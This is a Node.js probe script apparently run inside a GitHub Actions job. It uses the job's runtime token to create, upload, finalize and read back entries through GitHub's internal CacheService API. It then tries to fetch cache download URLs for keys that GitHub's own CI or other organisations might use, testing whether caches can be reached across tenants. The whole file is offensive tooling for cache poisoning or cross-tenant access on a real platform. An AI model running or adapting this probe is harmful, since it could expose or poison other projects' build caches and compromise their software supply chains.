const https = require('https');
const crypto = require('crypto');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';

const KNOWN_CACHE_KEY = 'probe-cross-run-v9-cache';
const KNOWN_VERSION = crypto.createHash('sha256').update(KNOWN_CACHE_KEY + '\nnode_modules').digest('hex');

function post(host, path, body) {
  return new Promise((resolve) => {
    const s = JSON.stringify(body);
    const r = https.request({
      hostname: host, path, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 800) })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
}

function blobUpload(url, content) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const buf = Buffer.from(content, 'utf8');
    const r = https.request({
      hostname: u.hostname, path: u.pathname + u.search, method: 'PUT',
      headers: { 'Content-Type': 'application/octet-stream', 'Content-Length': buf.length, 'x-ms-blob-type': 'BlockBlob' }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(buf); r.end();
  });
}

async function main() {
  if (!RESULTS_URL || !RUNTIME_TOKEN) { console.log('Missing env'); return; }
  const host = new URL(RESULTS_URL).hostname;

  console.log('=== V9: Create-Upload-Finalize-Read Cache Cycle ===');
  console.log('Key:', KNOWN_CACHE_KEY, '| Version (sha256):', KNOWN_VERSION.substring(0, 16) + '...');
  console.log('Run UUID:', ORCHESTRATION_ID.split('.')[0]);

  // STEP 1: CreateCacheEntry
  const r1 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', {
    key: KNOWN_CACHE_KEY,
    version: KNOWN_VERSION,
  });
  console.log('\n[1] CreateCacheEntry:', r1.status, '|', r1.body.substring(0, 300));

  if (r1.status !== 200 || !r1.body.includes('signed_upload_url')) {
    console.log('ERROR: Could not create cache entry. Stopping.');
    return;
  }

  let parsed;
  try { parsed = JSON.parse(r1.body); } catch(e) { console.log('Parse error:', e.message); return; }
  const signedUploadUrl = parsed.signed_upload_url;
  console.log('SignedUploadUrl:', signedUploadUrl.substring(0, 80) + '...');

  // Extract cacheId from URL path (format: /actions-cache/{shard}-{cacheId})
  const blobPath = new URL(signedUploadUrl).pathname;
  const cacheIdMatch = blobPath.match(/\/actions-cache\/\d+-(\d+)/);
  const cacheId = cacheIdMatch ? cacheIdMatch[1] : null;
  console.log('Extracted cacheId:', cacheId);

  // STEP 2: Upload content to Azure Blob
  const cacheContent = JSON.stringify({
    msg: 'probe-v9-cache-test',
    key: KNOWN_CACHE_KEY,
    version: KNOWN_VERSION,
    runUUID: ORCHESTRATION_ID.split('.')[0],
    timestamp: new Date().toISOString(),
  });
  const r2 = await blobUpload(signedUploadUrl, cacheContent);
  console.log('\n[2] Azure Blob Upload:', r2.status, '|', r2.body.substring(0, 100));

  if (r2.status !== 201) {
    console.log('WARNING: Upload may have failed');
  }

  // STEP 3: FinalizeCacheEntryUpload — commit the cache entry
  // Try both cacheId and key+version variants
  const r3a = await post(host, '/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', {
    key: KNOWN_CACHE_KEY,
    version: KNOWN_VERSION,
    sizeMb: Math.ceil(cacheContent.length / (1024*1024)) || 1,
  });
  console.log('\n[3a] FinalizeCacheEntryUpload (key+version):', r3a.status, '|', r3a.body.substring(0, 300));

  if (cacheId) {
    const r3b = await post(host, '/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', {
      cacheId: parseInt(cacheId),
      sizeMb: 1,
    });
    console.log('[3b] FinalizeCacheEntryUpload (cacheId):', r3b.status, '|', r3b.body.substring(0, 300));
  }

  // STEP 4: GetCacheEntryDownloadURL — read back in SAME run
  // If ok:true → cache was committed and we can read it in the same run
  const r4 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: KNOWN_CACHE_KEY,
    version: KNOWN_VERSION,
  });
  console.log('\n[4] GetCacheEntryDownloadURL (same run):', r4.status, '|', r4.body);

  if (r4.status === 200) {
    try {
      const resp = JSON.parse(r4.body);
      if (resp.ok && resp.signed_download_url) {
        console.log('\n!!! CACHE READ SUCCESS IN SAME RUN !!!');
        console.log('Download URL:', resp.signed_download_url.substring(0, 100) + '...');
        console.log('Matched key:', resp.matched_key);
      }
    } catch(e) {}
  }

  // STEP 5: Also probe GitHub's OWN cached workflows
  // These are keys that github.com/github's own CI might use
  // If cache is globally scoped, we might get ok:true on these
  console.log('\n=== STEP 5: Probe for caches from other orgs (global scope test) ===');
  const TARGET_KEYS = [
    { key: 'v1-npm-cache-', version: crypto.createHash('sha256').update('package-lock.json').digest('hex') },
    { key: 'v1-gems-', version: crypto.createHash('sha256').update('Gemfile.lock').digest('hex') },
    { key: 'runner-tool-cache', version: 'latest' },
  ];
  for (const { key, version } of TARGET_KEYS) {
    const r = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', { key, version });
    let label = 'MISS';
    if (r.status === 200) {
      try {
        const resp = JSON.parse(r.body);
        if (resp.ok && resp.signed_download_url) label = '*** HIT ***';
      } catch(e) {}
    }
    console.log(`[5] key=${key}: ${r.status} ${label}`);
  }

  // Print key and version for cross-run test (v10 will try to read this)
  console.log('\n=== Cross-run test data for v10 ===');
  console.log('CROSS_RUN_KEY=' + KNOWN_CACHE_KEY);
  console.log('CROSS_RUN_VERSION=' + KNOWN_VERSION);
  console.log('CREATED_BY_RUN=' + ORCHESTRATION_ID.split('.')[0]);
}

main().catch(e => console.log('Fatal:', e.message));
